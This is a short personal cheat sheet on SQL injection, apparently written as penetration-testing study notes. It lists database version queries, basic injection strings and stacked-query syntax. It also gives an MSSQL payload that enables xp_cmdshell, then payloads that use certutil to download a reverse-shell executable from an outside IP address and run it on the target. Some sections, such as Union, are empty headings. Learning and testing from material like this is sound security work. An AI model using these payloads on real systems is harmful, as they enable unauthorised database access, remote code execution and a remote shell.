
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

Finding the SQL version:

Oracle           `SELECT banner FROM v$version   SELECT version FROM v$instance   `
Microsoft      `SELECT @@version`
PostgreSQL   `SELECT version()`
MySQL          `SELECT @@version`
SQLite           `SELECT sqlite_version()`

### Basics

`' OR 1=1 --` obs, not safe as all rows are returned/possibly updated

`something we know works' AND 1=1 --` safer alternative

### In-Band SQLi

### Union


### Stacked Queries

not available in all  systems

`' ; new query here; --`

# Stored procedures and functions

Procedures and functions within a  database  management system.

MSSQL has **xp_cmdshell** that might be used to execute os calls to get rce (remote code execution). (By using EXECUTE  / EXEC to run windows shell commands!!)

Disabled by default! Still common irl. New secure replacement fir example SSIS (SQL Server Integration Services).
Even when disabled, it can be enabled with an EXEC query if the user has the 'sysadmin' role or have the 'alter settings' server level permission.
`'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`

# Upload and execute exploit/rev shell

`'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.18.21.236:8000/win64-reverse.exe C:\Windows\Temp\reverse.exe'; --`
`'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`


